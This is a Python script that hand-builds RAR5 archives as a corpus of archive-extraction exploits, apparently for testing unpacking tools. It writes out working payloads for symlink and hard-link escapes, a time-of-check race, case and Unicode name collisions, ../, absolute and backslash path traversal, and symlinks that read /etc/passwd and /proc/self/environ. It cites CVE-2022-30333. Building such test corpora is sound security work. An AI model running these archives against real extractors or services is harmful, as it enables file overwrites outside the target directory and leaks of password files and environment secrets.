import struct, zlib, unicodedata

# Hand-rolled RAR5 writer. There is no free/open RAR *creation* tool — unrar and
# rarfile are read-only and the proprietary `rar` binary sanitizes names — so the
# malicious archives are emitted directly from the published RAR5 format
# (the techspec shipped in the UnRAR source).
#
# RAR5 is the one format besides tar that can carry the WHOLE corpus: its
# FHEXTRA_REDIR extra record encodes both Unix symlinks (RedirType 1) and hard
# links (RedirType 4), so unlike zip/7z this includes the hard-link overwrite.
# This is also the format with the strongest real bug history for exactly this
# attack: CVE-2022-30333 (unrar symlink traversal, exploited against Zimbra).
#
# Block layout (all multi-byte ints are RAR5 vints unless noted):
#   CRC32 (4 bytes LE) | HeaderSize vint | HeaderType | HeaderFlags |
#   [ExtraSize] [DataSize] | <type fields> <Name> | <ExtraArea> || <DataArea>
# HeaderSize counts HeaderType..end-of-ExtraArea. The CRC covers HeaderSize..
# end-of-ExtraArea. DataArea is outside both.

SIG = bytes([0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00])  # "Rar!\x1a\x07\x01\x00"

HFL_EXTRA, HFL_DATA = 0x0001, 0x0002          # header flags
FFL_DIR, FFL_CRC = 0x0001, 0x0004             # file flags
REDIR, SYMLINK, HARDLINK = 0x05, 0x0001, 0x0004
REDIR_DIR = 0x0001                            # redirect flag: target is a directory
HOST_WIN, HOST_UNIX = 0, 1

def vint(n):
    out = bytearray()
    while True:
        b, n = n & 0x7f, n >> 7
        out.append(b | 0x80 if n else b)
        if not n:
            return bytes(out)

def block(htype, type_fields, *, data=b"", extra=b""):
    flags = (HFL_EXTRA if extra else 0) | (HFL_DATA if data else 0)
    head = vint(htype) + vint(flags)
    if extra:
        head += vint(len(extra))
    if data:
        head += vint(len(data))
    body = head + type_fields + extra
    crc_input = vint(len(body)) + body
    return struct.pack("<I", zlib.crc32(crc_input) & 0xffffffff) + crc_input + data

def redir(redir_type, target, *, is_dir=False):
    tb = target.encode("utf-8")
    payload = vint(REDIR) + vint(redir_type) + vint(REDIR_DIR if is_dir else 0) + vint(len(tb)) + tb
    return vint(len(payload)) + payload   # extra record = size-prefixed payload

def file_header(name, *, data=b"", attrs=0o644, host=HOST_UNIX, fflags=0, extra=b""):
    nb = name.encode("utf-8")
    if data:
        fflags |= FFL_CRC
    fields = vint(fflags) + vint(len(data)) + vint(attrs)
    if data:
        fields += struct.pack("<I", zlib.crc32(data) & 0xffffffff)
    fields += vint(0) + vint(host) + vint(len(nb)) + nb   # comp-info=store, host, name
    return block(2, fields, data=data, extra=extra)

# A RAR5 symlink/hard-link carries the target in the FHEXTRA_REDIR record AND, as
# real RAR tools emit (and libarchive requires — non-directory blocks must set
# HFL_DATA), stores that same target string as the entry's data area.
def sym(name, target, *, is_dir):     # symlink entry -> target
    return file_header(name, data=target.encode("utf-8"), attrs=0o120777,
                       extra=redir(SYMLINK, target, is_dir=is_dir))
def hardlink(name, target):           # hard-link entry -> existing file (overwrite primitive)
    return file_header(name, data=target.encode("utf-8"), attrs=0o100644,
                       extra=redir(HARDLINK, target))
def directory(name):
    return file_header(name, attrs=0o040755, fflags=FFL_DIR)
def regfile(name, data, attrs=0o100644, host=HOST_UNIX):
    return file_header(name, data=data, attrs=attrs, host=host)

def write(path, *entries):
    out = SIG + block(1, vint(0))                 # main archive header (ArchiveFlags=0)
    for e in entries:
        out += e
    out += block(5, vint(0))                      # end-of-archive header (flags=0)
    with open(path, "wb") as f:
        f.write(out)

# 1) cache-poisoning TOCTOU: validate d/sub, overwrite it with a symlink, write through it
write("toctou-slip.rar",
      directory("d/sub"),                          # dir (extractor validates/caches it)
      sym("d/sub", "/tmp", is_dir=True),           # same path -> symlink out
      regfile("d/sub/PWNED.txt", b"x"))            # write through -> /tmp/PWNED.txt

# 2) case-insensitive collision (LINK vs link)
write("case-slip.rar",
      sym("LINK", "/tmp", is_dir=True),
      regfile("link/PWNED.txt", b"x"))

# 3) Unicode NFC/NFD collision (café vs café)
write("unicode-slip.rar",
      sym(unicodedata.normalize("NFC", "café"), "/tmp", is_dir=True),
      regfile(unicodedata.normalize("NFD", "café") + "/PWNED.txt", b"x"))

# 4) Unicode NFKC compatibility collision (ﬁle vs file) — only NFKC triggers it
write("unicode-nfkc-slip.rar",
      sym("ﬁle", "/tmp", is_dir=True),             # "ﬁle" (U+FB01 fi ligature)
      regfile("file/PWNED.txt", b"x"))             # "file" -> collides under NFKC

# 5) hard-link overwrite: link hl -> existing /tmp/VICTIM.txt, then write through it.
#    Test by creating the victim first:  echo original > /tmp/VICTIM.txt
write("hardlink-slip.rar",
      hardlink("hl", "/tmp/VICTIM.txt"),           # hard-link out to an existing file
      regfile("hl", b"PWNED"))                     # write through -> overwrites the victim

# 6) exfiltration via symlink: symlinks that survive extraction and leak host
#    files when the output is later served or read.
write("exfil-slip.rar",
      sym("passwd", "/etc/passwd", is_dir=False),
      sym("env", "/proc/self/environ", is_dir=False),
      sym("root", "/", is_dir=True))

# 7) exfiltration via hard link: a lone hard link, no second entry and no
#    overwrite. The extracted name shares the target's inode, so reading it back
#    leaks the file even where symlinks are refused. Needs the same filesystem as
#    the target and (with Linux protected_hardlinks) an extractor that owns or can
#    write it, in practice one running as root.
write("hardlink-exfil-slip.rar", hardlink("passwd", "/etc/passwd"))

# 8) plain ../ path traversal
write("dotdot-slip.rar", regfile("../../../../../../tmp/PWNED.txt", b"x"))

# 9) absolute path (extractor that doesn't strip a leading "/")
write("abs-slip.rar", regfile("/tmp/PWNED.txt", b"x"))

# 10) Windows backslash traversal (sanitizer that only splits on "/")
write("backslash-slip.rar", regfile("..\\..\\..\\..\\..\\..\\tmp\\PWNED.txt", b"x"))

# 11) read-only files: 0444 (Unix) and the DOS read-only attribute. `rm` prompts
#     "remove write-protected file?" and needs -f; on Windows clear the attr first.
write("readonly-slip.rar",
      regfile("readonly-unix.txt", b"can't rm me without -f\n", attrs=0o100444),
      regfile("readonly-dos.txt", b"clear the read-only attr first\n",
              attrs=0x21, host=HOST_WIN))          # FILE_ATTRIBUTE_READONLY | ARCHIVE
